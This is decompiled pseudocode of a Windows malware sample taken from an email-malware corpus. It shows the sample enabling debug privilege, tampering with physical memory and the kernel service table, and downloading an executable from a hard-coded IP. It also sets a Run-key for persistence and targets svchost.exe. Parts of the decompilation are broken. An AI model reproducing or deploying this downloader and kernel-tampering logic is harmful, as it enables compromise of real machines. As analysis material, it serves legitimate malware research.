/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0009/ia32_pe/subject.exe'
 */

/*	Procedure: 0x13141340 - 0x131413D6
 *	Argument size: -296
 *	Local size: 300
 *	Save regs size: 0
 */

L13141340(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffed4;
	/* unknown */ void  Vfffffedc;
	/* unknown */ void  Vfffffef8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = *L13144000 ^ ebp;
    (save)esi;
    esi = A8;
    (save)edi;
    (save)0;
    (save)2;
    edi = CreateToolhelp32Snapshot();
    if(edi == -1) {
        eax = 0;
L1314136a:
        (restore)edi;
        ecx = Vfffffffc ^ ebp;
        (restore)esi;
        return(L131420E0());
    }
    (save) & Vfffffed4;
    (save)edi;
    Vfffffed4 = 296;
    if(Process32First() == 0) {
        esi = 0;
L13141395:
        (save)edi;
        *__imp__CloseHandle();
        eax = esi;
        goto L1314136a;
    }
    do {
        (save) & Vfffffef8;
        (save)esi;
        if(*__imp__lstrcmpiA() == 0) {
            goto L131413c8;
        }
        (save) & Vfffffed4;
        (save)edi;
    } while(Process32Next() != 0);
    esi = 1;
    goto L13141395;
L131413c8:
    (save)edi;
    *__imp__CloseHandle();
    eax = Vfffffedc;
    goto L1314136a;
}

/*	Procedure: 0x131413D7 - 0x131413EC
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L131413D7()
{



    (save)ebp;
    ebp = esp;
    (save)ecx;
    (save)ecx;
    (save)ebx;
    (save)esi;
    (save)edi;
    (save)0;
    esi = *__imp__GetModuleHandleA();
    eax = *(esi + 60);
    eax = *(esi + 60);
}

/* DEST BLOCK NOT FOUND: 1314144a -> 13141453 */
/*	Procedure: 0x13141442 - 0x13141453
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L13141442(A4)
/* unknown */ void  A4;
{



    if(*A4 != 0) {
        do {
            eax = eax + 1;
            ecx = ecx + 1;
        } while(*ecx != 0);
    }
}

/*	Procedure: 0x13141454 - 0x13141491
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L13141454(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    ecx = A4;
    al = *ecx;
    (save)esi;
    esi = A8;
    if(al != 0) {
        do {
            dl = *esi;
            if(dl == 0) {
                break;
            }
            if(al != dl) {
                goto L13141480;
            }
            ecx = ecx + 1;
            al = *ecx;
            esi = esi + 1;
        } while(al != 0);
        al = *ecx;
        if(al != 0) {
            if(*esi != 0) {
                goto L13141489;
            }
L13141480:
            (restore)esi;
            return(0);
        }
    }
    if(*esi != 0) {
L13141489:
        if(al == 0) {
            goto L13141480;
        }
    }
    (restore)esi;
    return(1);
}

/*	Procedure: 0x13141492 - 0x131414E1
 *	Argument size: 20
 *	Local size: 0
 *	Save regs size: 4
 */

L13141492(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  esi;



    esi = A8;
    if(*esi != 23117) {
L131414a0:
        al = 0;
    } else {
        A18 = *(esi + 60) + esi;
        if(*(A18 + 20) != 224) {
            goto L131414a0;
        }
        (save)A14;
        A14 = Ac;
        ecx = 16;
        asm("rep movsd");
        A14 = A10;
        ecx = 6;
        edx = A18 + 24;
        esi = A18;
        asm("rep movsd");
        ecx = 56;
        esi = edx;
        asm("rep movsd");
        *A18 = edx + 224;
        al = 1;
        (restore)A14;
    }
}

/*	Procedure: 0x131414E2 - 0x1314153D
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L131414E2(Ac, A10, A14)
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{



    eax = A10;
    ecx = *(eax + 60);
    (save)esi;
    esi = *(eax + 32);
    edx = 0;
    eax = ecx;
    esi = esi / esi;
    if(esi % esi != 0) {
        ecx = eax + 1;
        esi = esi * ecx;
    }
    eax = *(Ac + 6) & 65535;
    if(eax > 0) {
        (save)ebx;
        (save)edi;
        ebx = A14 + 8;
        A10 = eax;
        do {
            edi = *ebx;
            if(edi != 0) {
                edx = 0;
                eax = edi;
                esi = esi / esi;
                if(esi % esi != 0) {
                    eax = eax + 1;
                    esi = esi * eax;
                    ecx = ecx + eax;
                } else {
                    ecx = ecx + edi;
                }
            }
            ebx = ebx + 40;
        } while(A10 = A10 - 1);
        (restore)edi;
        (restore)ebx;
    }
    eax = ecx;
    (restore)esi;
}

/*	Procedure: 0x1314153E - 0x13141557
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L1314153E(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    eax = A4;
    edx = 0;
    A8 = A8 / A8;
    if(A8 % A8 == 0) {
        return(A4);
    }
    eax = eax + 1;
    A8 = A8 * eax;
}

/*	Procedure: 0x13141558 - 0x131415DC
 *	Argument size: 24
 *	Local size: 0
 *	Save regs size: 8
 */

L13141558(A8, A10, A14, A18, A1c)
/* unknown */ void  A8;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
{
	/* unknown */ void  ebx;



    (save) *(A14 + 60);
    (save)A8;
    (save)A1c;
    L131420F0();
    ebx = L1314153E( *(A14 + 60), *(A14 + 32)) + A1c;
    eax = A10;
    A1c = 0;
    if(*(eax + 6) > 0) {
        (save)edi;
        edi = A18 + 8;
        do {
            eax = *(edi + 8);
            if(eax > 0) {
                ecx = eax;
                eax = *edi;
                if(ecx > eax) {
                    ecx = eax;
                }
                (save)ecx;
                (save) *(edi + 12) + A8;
                (save)ebx;
                L131420F0();
                ebx = ebx + L1314153E( *edi, *(A14 + 32));
            }
            eax = *(A10 + 6) & 65535;
            A1c = A1c + 1;
            edi = edi + 40;
        } while(A1c < eax);
        (restore)edi;
    }
    return(1);
}

stack space not deallocated on return
/*	Procedure: 0x131415DD - 0x1314177B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L131415DD()
{
	/* unknown */ void  ebp;
	/* unknown */ void  Vfffffe34;



    ebp = & Vfffffe34;
    esp = esp - 652;
    *(ebp + 460) = *L13144000 ^ ebp;
    (save)ebx;
    (save)esi;
    (save)edi;
    edi = *(ebp + 472);
    esi = 260;
    (save)260;
    eax = ebp + 196;
    ebx = 0;
    (save)eax;
    *(ebp + 116) = 0;
    *__imp__GetSystemDirectoryA();
    edx = L13141442(edi);
    if(edx + L13141442(ebp + 196) >= esi) {
        eax = 0;
    } else {
        (save)edi;
        (save)ebp + 196;
        *__imp__lstrcatA();
        (save)ebx;
        (save)ebx;
        (save)3;
        (save)ebx;
        (save)1;
        (save)-2147483648;
        (save)ebp + 196;
        eax = *__imp__CreateFileA();
        *(ebp + 120) = eax;
        if(eax != -1) {
            (save)ebp + 36;
            (save)eax;
            *__imp__GetFileInformationByHandle();
            eax = *(ebp + 72);
            *(ebp + 128) = eax;
            if(eax != ebx) {
                esi = __imp__GetProcessHeap;
                (save)eax;
                (save)ebx;
                edi = __imp__HeapAlloc;
                (save) *__imp__GetProcessHeap();
                eax = *__imp__HeapAlloc();
                *(ebp + 124) = eax;
                if(eax != ebx) {
                    (save)ebx;
                    (save)ebp + 112;
                    (save) *(ebp + 128);
                    (save)eax;
                    (save) *(ebp + 120);
                    if(*__imp__ReadFile() != 0 && *(ebp + 112) == *(ebp + 128)) {
                        L13141492( *(ebp + 124), ebp + 132, ebp + 88, ebp + -188, ebp + 128);
                        if(al != 0) {
                            (save) *(ebp + 128);
                            (save)L131414E2(ebp + 132, ebp + 88, ebp + -188);
                            (save)ebx;
                            (save) *esi();
                            eax = *edi();
                            *(ebp + 116) = eax;
                            if(eax != ebx) {
                                L13141558( *(ebp + 124), ebp + 132, ebp + 88, ebp + -188, *(ebp + 128), eax);
                            }
                        }
                    }
                    (save) *(ebp + 124);
                    (save)ebx;
                    (save) *esi();
                    *__imp__HeapFree();
                }
            }
            (save) *(ebp + 120);
            *__imp__CloseHandle();
        }
        eax = *(ebp + 116);
    }
    ecx = *(ebp + 460);
    (restore)edi;
    (restore)esi;
    ecx = ecx ^ ebp;
    (restore)ebx;
    ebp = ebp + 464;
    return(L131420E0());
}

/*	Procedure: 0x1314177C - 0x131417F2
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L1314177C(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    (save)ecx;
    (save)ecx;
    (save)ebx;
    (save)esi;
    (save)edi;
    edi = A8;
    if(edi != 0 && Ac != 0) {
        A8 = 0;
        eax = *( *(edi + 60) + edi + 120) + edi;
        ecx = *(eax + 24);
        esi = *(eax + 32);
        ebx = *(eax + 36);
        eax = *(eax + 28) + edi;
        esi = esi + edi;
        ebx = ebx + edi;
        *(ebp - 4) = ecx;
        *(ebp - 8) = eax;
        if(ecx > 0) {
            do {
                if(L13141454( *(esi + A8 * 4) + edi, Ac) == 1) {
                    goto L131417e4;
                }
                A8 = A8 + 1;
            } while(A8 < *(ebp - 4));
        }
    }
    eax = 0;
L131417df:
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    return;
L131417e4:
    eax = *(ebx + A8 * 2) & 65535;
    eax = *( *(ebp - 8) + eax * 4);
    goto L131417df;
}

/*	Procedure: 0x131417F3 - 0x131418AD
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L131417F3(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    (save)ecx;
    (save)esi;
    esi = A8;
    if(esi == 0) {
        eax = 0;
    } else {
        eax = *( *(esi + 60) + esi + 120) + esi;
        ecx = *(eax + 24);
        (save)ebx;
        ebx = *(eax + 36);
        (save)edi;
        edi = *(eax + 32);
        eax = *(eax + 28) + esi;
        edx = 0;
        edi = edi + esi;
        ebx = ebx + esi;
        *(ebp - 8) = ecx;
        *(ebp - 4) = eax;
        A8 = 0;
        if(ecx > 0) {
            while(1) {
                ecx = *(eax + ( *(ebx + edx * 2) & 65535) * 4);
                edx = *(edi + edx * 4);
                ecx = ecx + esi;
                edx = edx + esi;
                if(*L13144028 != 0) {
                    if(*L13144028 != 1 || *ecx != 184 || *(ecx + 5) != 186 || *(ecx + 6) != 0 || *(ecx + 7) != 3 || *(ecx + 8) != 254) {
                        goto L1314189a;
                    }
                } else {
                    if(*ecx != 184 || *(ecx + 9) != 205) {
                        goto L1314189a;
                    }
                    *(ecx + 10) :: 46;
                }
                if(*(ecx + 9) == 127) {
                    ecx = *(ecx + 1);
                    if(ecx < A10) {
                        *(Ac + ecx * 4) = edx;
                    }
                }
L1314189a:
                edx = A8 + 1;
                A8 = edx;
                if(edx >= *(ebp - 8)) {
                    break;
                }
                eax = *(ebp - 4);
            }
        }
        (restore)edi;
        eax = 1;
        (restore)ebx;
    }
    (restore)esi;
}

stack space not deallocated on return
/*	Procedure: 0x131418AE - 0x1314195C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L131418AE()
{



    (save)esi;
    (save)edi;
    (save)"ntdll.dll";
    edi = *__imp__GetModuleHandleA();
    *L13144030 = *__imp__GetProcAddress();
    *L13144038 = *__imp__GetProcAddress();
    *L13144040 = *__imp__GetProcAddress();
    *L1314403C = *__imp__GetProcAddress();
    *L13144020 = *__imp__GetProcAddress();
    *L13144024 = *__imp__GetProcAddress();
    eax = *__imp__GetProcAddress(edi, "ZwQuerySystemInformation", edi, "NtUnmapViewOfSection", edi, "NtMapViewOfSection", edi, "NtOpenSection", edi, "RtlFreeUnicodeString", edi, "RtlInitAnsiString", edi, "RtlAnsiStringToUnicodeString");
    ecx = 0;
    (restore)edi;
    *L1314402C = eax;
    (restore)esi;
    if(*L13144030 != 0 && *L13144038 != 0 && *L13144040 != 0 && *L1314403C != 0 && *L13144020 != 0 && *L13144024 != 0 && eax != 0) {
        return(1);
    }
    return(0);
}

/*	Procedure: 0x1314195D - 0x131419C2
 *	Argument size: -44
 *	Local size: 44
 *	Save regs size: 0
 */

L1314195D()
{
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffffc;



    *L13144038();
    eax = *L13144030( & Vffffffec, & Vfffffff4, 1, & Vfffffff4, "\device\physicalmemory");
    if(eax != 0) {
L13141986:
        return(eax | -1);
    }
    Vffffffd8 = 0;
    Vffffffe4 = 0;
    Vffffffe8 = 0;
    Vffffffd4 = 24;
    Vffffffe0 = 64;
    Vffffffdc = & Vffffffec;
    eax = *L1314403c( & Vfffffffc, 6, & Vffffffd4);
    if(eax != 0) {
        goto L13141986;
    }
    return(Vfffffffc);
}

/*	Procedure: 0x131419C3 - 0x13141A0B
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L131419C3(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{



    eax = A14;
    *eax = 0;
    *(ebp - 8) = *Ac;
    *(ebp - 4) = 0;
    if(*L13144020(A8, -1, eax, 0, *A10, ebp - 8, A10, 1, 0, 4, edi, Ac, A10, A10) != 0) {
        eax = 0;
    } else {
        *Ac = *(ebp - 8);
        eax = 1;
    }
    (restore)edi;
    (restore)Ac;
}

stack space not deallocated on return
/*	Procedure: 0x13141A0C - 0x13141A18
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L13141A0C(A4)
/* unknown */ void  A4;
{



    return(*L13144024(-1, A4));
}

stack space not deallocated on return
/*	Procedure: 0x13141A19 - 0x13141B38
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L13141A19()
{
	/* unknown */ void  ebp;
	/* unknown */ void  Vffffff20;



    ebp = & Vffffff20;
    esp = esp - 356;
    *(ebp + 224) = *L13144000 ^ ebp;
    (save)esi;
    (save)edi;
    (save)"\device\physicalmemory";
    (save)ebp - 128;
    esi = 0;
    *L13144038();
    edi = 1;
    (save)1;
    (save)ebp - 128;
    (save)ebp - 120;
    if(*L13144030() != 0) {
L13141a5d:
        eax = 0;
    } else {
        *(ebp - 68) = ebp - 120;
        (save)ebp - 76;
        (save)393216;
        (save)ebp - 44;
        *(ebp - 76) = 24;
        *(ebp - 72) = esi;
        *(ebp - 64) = 64;
        *(ebp - 60) = esi;
        *(ebp - 56) = esi;
        if(*L1314403c() != 0) {
            goto L13141a5d;
        }
        (save)ebp - 112;
        (save)esi;
        (save)ebp - 48;
        (save)esi;
        (save)esi;
        (save)4;
        (save)6;
        (save) *(ebp - 44);
        if(*__imp__GetSecurityInfo() == 0) {
            (save)ebp - 52;
            (save)ebp - 36;
            *(ebp - 52) = 259;
            *__imp__GetUserNameA();
            *(ebp - 80) = ebp - 36;
            (save)ebp - 40;
            (save) *(ebp - 48);
            (save)ebp - 108;
            (save)edi;
            *(ebp - 108) = 2;
            *(ebp - 104) = edi;
            *(ebp - 100) = esi;
            *(ebp - 96) = esi;
            *(ebp - 92) = esi;
            *(ebp - 88) = edi;
            *(ebp - 84) = edi;
            if(*__imp__SetEntriesInAclA() == 0) {
                (save)esi;
                (save) *(ebp - 40);
                (save)esi;
                (save)esi;
                (save)4;
                (save)6;
                (save) *(ebp - 44);
                if(*__imp__SetSecurityInfo() == 0) {
                    esi = edi;
                }
                (save) *(ebp - 40);
                *__imp__LocalFree();
            }
        }
        eax = esi;
    }
    ecx = *(ebp + 224);
    (restore)edi;
    ecx = ecx ^ ebp;
    (restore)esi;
    ebp = ebp + 228;
    return(L131420E0());
}

stack space not deallocated on return
/*	Procedure: 0x13141B39 - 0x13141BDE
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 24
 */

L13141B39(A28, A2c, A30)
/* unknown */ void  A28;
/* unknown */ void  A2c;
/* unknown */ void  A30;
{
	/* unknown */ void  ecx;
	/* unknown */ void  ecx;
	/* unknown */ void  ebx;
	/* unknown */ void  ebp;
	/* unknown */ void  esi;



    ebp = __imp__HeapFree;
    ebx = -2143289344;
    A28 = *__imp__GetProcessHeap();
    A2c = 32768;
    for(A2c = -2143289344; 1; A2c = A2c + A2c) {
        (save)A2c;
        (save)0;
        (save)A30;
        esi = *__imp__HeapAlloc();
        if(esi == 0) {
            goto L13141bba;
        }
        (save)0;
        (save)A2c;
        (save)esi;
        (save)11;
        eax = *L1314402c();
        if(eax != -1073741820) {
            break;
        }
        *ebp(A30, 0, esi);
    }
    if(eax == 0) {
        edx = *esi;
        A2c = 0;
        edx :: 0;
        if(eax = esi + 4) {
            goto L13141bc5;
        }
        ebx = eax + 28;
        ecx = 284;
        do {
            if(ebx != "ntoskrnl.exe") {
                goto L13141bd2;
            }
            eax = eax + ecx;
            ebx = ebx + ecx;
            A2c = A2c + 1;
        } while(A2c < edx);
        goto L13141bc5;
L13141bba:
        eax = ebx;
L13141bbc:
        return;
    }
    A2c = ebx;
L13141bc5:
    (save)esi;
    (save)0;
    (save)A30;
    *ebp();
    eax = A2c;
    goto L13141bbc;
L13141bd2:
    A2c = *(eax + 8);
    goto L13141bc5;
}

/*	Procedure: 0x13141BDF - 0x13141C56
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 12
 */

L13141BDF(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    edi = A10;
    eax = *(edi + 136);
    if(eax != 0 && *(edi + 140) != 0) {
        ecx = A8 + eax;
        if(*(ecx + 4) != 0) {
            do {
                A10 = 0;
                edx = *(ecx + 4) - 8 >> 1;
                edx :: 0;
                if(!(esi = ecx + 8)) {
                    do {
                        eax = *esi & 65535;
                        bx = eax & 61440;
                        if(bx == 12288 && (eax & 4095) + *(edi + 28) + *ecx == Ac) {
                            goto L13141c52;
                        }
                        esi = esi + 1 + 1;
                        A10 = A10 + 1;
                    } while(A10 < edx);
                }
                ecx = esi;
            } while(*(esi + 4) != 0);
        }
    }
    eax = 0;
L13141c4d:
    return;
L13141c52:
    eax = 1;
    goto L13141c4d;
}

/*	Procedure: 0x13141C57 - 0x13141CFE
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L13141C57(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    (save)ecx;
    ecx = A10;
    (save)ebx;
    (save)esi;
    esi = *(ecx + 136);
    (save)edi;
    if(esi != 0 && *(ecx + 140) != 0) {
        esi = esi + A8;
        if(*(esi + 4) != 0) {
            do {
                *(ebp - 4) = 0;
                edi = *(esi + 4) - 8 >> 1;
                edi :: 0;
                if(!(ebx = esi + 8)) {
                    do {
                        eax = *ebx & 65535;
                        dx = eax & 61440;
                        if(dx == 12288) {
                            edx = *(ecx + 28) + Ac;
                            eax = (eax & 4095) + *esi + A8;
                            if(*eax == edx && *(eax - 2) == 1479) {
                                eax = *(eax + 4);
                                *(ebp - 8) = eax;
                                eax = L13141BDF(A8, eax, ecx);
                                ecx = A10;
                                if(eax != 0) {
                                    goto L13141cf7;
                                }
                            }
                        }
                        ebx = ebx + 1 + 1;
                        *(ebp - 4) = *(ebp - 4) + 1;
                    } while(*(ebp - 4) < edi);
                }
                esi = ebx;
            } while(*(ebx + 4) != 0);
        }
    }
    eax = 0;
L13141cf2:
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    return;
L13141cf7:
    eax = *(ebp - 8) - *(ecx + 28);
    goto L13141cf2;
}

stack space not deallocated on return
/*	Procedure: 0x13141CFF - 0x13141DC7
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L13141CFF(A4)
/* unknown */ void  A4;
{



    eax = *L13144034;
    if(eax != 0) {
        return(*__imp__HeapAlloc(eax, 0, A4));
    }
    return(0);
    (save)ebp;
    ebp = esp;
    (save)ecx;
    (save)ebx;
    (save)esi;
    (save)edi;
    (save)"KERNEL32_DLL";
    *__imp__LoadLibraryA();
    (save)"ADVAPI32_DLL";
    *__imp__LoadLibraryA();
    (save)"IMGHLP_DLL";
    *__imp__LoadLibraryA();
    (save)"SHELL32_DLL";
    *__imp__LoadLibraryA();
    (save)"WS2_32_DLL";
    *__imp__LoadLibraryA();
    (save)"URLMON_DLL";
    *__imp__LoadLibraryA();
    (save)"WININET_DLL";
    *__imp__LoadLibraryA();
    (save)"WINMM_DLL";
    *__imp__LoadLibraryA();
    (save)"USER32_DLL";
    *__imp__LoadLibraryA();
    edi = 0;
    (save)0;
    (save)0;
    esi = ".exeINDOWS\notep1.exe";
    (save)esi;
    ebx = "http://91.213.72.10/pinesk/pinec/pinesk1.exeINDOWS\notep1.exe";
    (save)ebx;
    (save)0;
    URLDownloadToFileA();
    (save)0;
    (save)ebp - 4;
    (save)0;
    (save)2;
    (save)0;
    (save)0x131411c8;
    (save)0;
    (save)"Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run";
    (save)-2147483646;
    *__imp__RegCreateKeyExA();
    if(*(ebp - 4) != edi) {
        *__imp__RegSetValueExA();
        *__imp__RegCloseKey( *(ebp - 4), *(ebp - 4), ebx, edi, 1, esi, L13142460(esi));
    }
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    (restore)ebp;
    return(1);
}

/*	Procedure: 0x13141DC8 - 0x13141E2B
 *	Argument size: -28
 *	Local size: 28
 *	Save regs size: 0
 */

L13141DC8()
{
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    (save) & Vfffffffc;
    (save)40;
    (save) *__imp__GetCurrentProcess();
    *__imp__OpenProcessToken();
    (save) & Vfffffff4;
    (save)"SeDebugPrivilege";
    (save)0;
    *__imp__LookupPrivilegeValueA();
    Vffffffe8 = Vfffffff4;
    Vffffffec = Vfffffff8;
    Vffffffe4 = 1;
    Vfffffff0 = 2;
    *__imp__AdjustTokenPrivileges();
    return(*__imp__CloseHandle(Vfffffffc, Vfffffffc, 0, & Vffffffe4, 16, 0, 0));
}

stack space not deallocated on return
/*	Procedure: 0x13141E2C - 0x13142092
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L13141E2C()
{
	/* unknown */ void  ebp;
	/* unknown */ void  Vffffff8c;



    ebp = & Vffffff8c;
    esp = esp - 496;
    *(ebp + 116) = *L13144000 ^ ebp;
    (save)ebp - 32;
    *(ebp - 32) = 148;
    *__imp__GetVersionExA();
    if(*(ebp - 28) != 5) {
L13141e58:
        al = 1;
    } else {
        eax = *(ebp - 24);
        if(eax != 0 && eax != 1) {
            goto L13141e58;
        }
        *L13144028 = eax;
        if(L131418AE() == 0) {
            goto L13141e58;
        }
        L13141A19();
        eax = L1314195D();
        *(ebp - 108) = eax;
        if(eax == -1) {
            eax = L1314195D();
            *(ebp - 108) = eax;
            if(eax == -1) {
                goto L13141e58;
            }
        }
        (save)edi;
        edi = L131415DD("\ntoskrnl.exe");
        *(ebp - 120) = edi;
        if(edi == 0) {
            al = 1;
        } else {
            (save)esi;
            esi = L1314177C(edi, "KeServiceDescriptorTable");
            *(ebp - 128) = esi;
            if(esi != 0) {
                L13141492(edi, ebp - 96, ebp + -152, ebp + -376, ebp - 124);
                if(al != 0) {
                    goto L13141ef5;
                }
            }
            al = 1;
            goto L1314207e;
L13141ef5:
            (save)ebx;
            *(ebp - 100) = 0;
            eax = L13141B39() - -2147483648;
            ecx = eax - *(ebp + -348);
            eax = eax + esi;
            *(ebp - 112) = eax;
            esi = *(ebp - 112);
            ebx = 8192;
            *(ebp - 124) = ecx;
            *(ebp - 104) = 8192;
            if(L131419C3( *(ebp - 108), ebp - 112, ebp - 104, ebp - 100) != 0) {
                esi = esi - *(ebp - 112);
                eax = *(ebp - 104) - esi;
                if(eax < 4) {
                    goto L1314208f;
                }
                eax :: 12;
                edx = *(ebp - 100);
                esi = *ecx;
                if(!(ecx = esi + edx)) {
                    *(ebp - 116) = *(ecx + 8);
                }
                L13141A0C(edx);
                if(*(ebp - 116) >= 300) {
                    goto L1314208f;
                }
                *(ebp - 100) = 0;
                edi = esi + -2147483648;
                *(ebp - 112) = edi;
                *(ebp - 104) = ebx;
                if(L131419C3( *(ebp - 108), ebp - 112, ebp - 104, ebp - 100) != 0) {
                    eax = *(ebp - 104);
                    ebx = *(ebp - 116);
                    esi = edi - *(ebp - 112);
                    if(eax - esi >> 2 >= ebx) {
                        eax = L13141CFF(ebx << 2);
                        (restore)ecx;
                        *(ebp - 108) = eax;
                        if(eax == 0) {
                            goto L1314208f;
                        }
                        eax = L131415DD("\ntdll.dll");
                        if(eax == 0) {
                            goto L1314208f;
                        }
                        L131417F3(eax, *(ebp - 108), ebx);
                        ebx = esi + *(ebp - 100);
                        if(!(esi = L13141C57( *(ebp - 120), *(ebp - 128), ebp + -376) + *(ebp - 120)) && edi - *(ebp + -348) - *(ebp - 124) + *(ebp - 120) != esi) {
                            edi = __imp__IsBadReadPtr;
                            (save)4;
                            (save)esi;
                            if(*__imp__IsBadReadPtr() == 0) {
                                (save)4;
                                (save)( *(ebp - 116) << 2) + esi - 4;
                                if(*edi() == 0) {
                                    edi = *(ebp - 116);
                                    if(edi > 0) {
                                        eax = ebx;
                                        esi = esi - ebx;
                                        do {
                                            ebx = *eax;
                                            edx = *(ebp - 124);
                                            ecx = *(esi + eax);
                                            if(ebx - edx - -2147483648 != ecx) {
                                                *eax = ecx + edx + -2147483648;
                                            }
                                            eax = eax + 4;
                                        } while(edi = edi - 1);
                                    }
                                }
                            }
                        }
                        L13141A0C( *(ebp - 100));
                    }
                }
            }
            al = 0;
L1314207d:
            (restore)ebx;
L1314207e:
            (restore)esi;
        }
        (restore)edi;
    }
    ecx = *(ebp + 116) ^ ebp;
    ebp = ebp + 120;
    return(L131420E0());
L1314208f:
    al = 1;
    goto L1314207d;
}

stack space not deallocated on return
/*	Procedure: 0x13142093 - 0x131420C7
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    L13141DC8();
    L13141E2C();
    (save)0x13141d19;
    (save)"svchost.exe";
    (save)L13141340();
    (save)0;
    L131413D7( *__imp__OpenProcess(), 2035711);
    return(0);
}

/* DEST BLOCK NOT FOUND: 131420c8 -> 131413d7 */
/*	Procedure: 0x131420C8 - 0x131420CD
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

Process32Next()
{



    goto ( *__imp__Process32Next);
}

/* DEST BLOCK NOT FOUND: 131420ce -> 131413d7 */
/*	Procedure: 0x131420CE - 0x131420D3
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

Process32First()
{



    goto ( *__imp__Process32First);
}

/* DEST BLOCK NOT FOUND: 131420d4 -> 131413d7 */
/*	Procedure: 0x131420D4 - 0x131420D9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

CreateToolhelp32Snapshot()
{



    goto ( *__imp__CreateToolhelp32Snapshot);
}

/* DEST BLOCK NOT FOUND: 131420da -> 131413d7 */
/*	Procedure: 0x131420DA - 0x131420DF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

URLDownloadToFileA()
{



    goto ( *__imp__URLDownloadToFileA);
}

/* DEST BLOCK NOT FOUND: 131420ea -> 131424eb */
/*	Procedure: 0x131420E0 - 0x131420EF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L131420E0()
{



    if(ecx == *L13144000) {
        asm("rep ret");
    }
    goto L131424eb;
    asm("int3");
}

/* DEST BLOCK NOT FOUND: 13142132 -> 13142676 */
/*	Procedure: 0x131420F0 - 0x1314245F
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 8
 */

L131420F0(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    esi = Ac;
    ecx = A10;
    edi = A8;
    eax = ecx;
    edx = ecx;
    eax = eax + esi;
    if(edi <= esi || edi >= eax) {
        if(ecx >= 256 && *L13144378 != 0) {
            (save)edi;
            (save)esi;
            edi = edi & 15;
            esi = esi & 15;
            (restore)esi;
            (restore)edi;
            if(edi != esi) {
                goto L13142137;
            }
            (restore)esi;
            (restore)edi;
            (restore)ebp;
            goto L13142676;
        }
L13142137:
        if(!(edi & 3)) {
            ecx = ecx >> 2;
            edx = edx & 3;
            if(ecx < 8) {
                goto L13142174;
            }
            asm("rep movsd");
            goto *(edx * 4 + 0x13142264)[L13142274, L1314227c, L13142288, L1314229c, ]goto ( *(edx * 4 + 0x13142264));
        }
        eax = edi;
        edx = 3;
        if(!(ecx = ecx - 4)) {
            eax = eax & 3;
            ecx = ecx + eax;
            goto ( *(eax * 4 + 0x13142178));
        }
        goto ( *(ecx * 4 + 0x13142274));
L13142174:
        goto *(ecx * 4 + 0x131421f8)[L1314225b, L13142248, L13142240, L13142238, L13142230, L13142228, L13142220, L13142218, ]goto ( *(ecx * 4 + 0x131421f8));
        *ecx = ah;
        asm("adc al,0x13");
        ah = 33;
        asm("adc al,0x13");
        (fsave)(frestore) - *ecx;
        asm("adc al,0x13");
        edx = edx & ecx;
        al = *esi;
        *edi = al;
        al = *(esi + 1);
        *(edi + 1) = al;
        al = *(esi + 2);
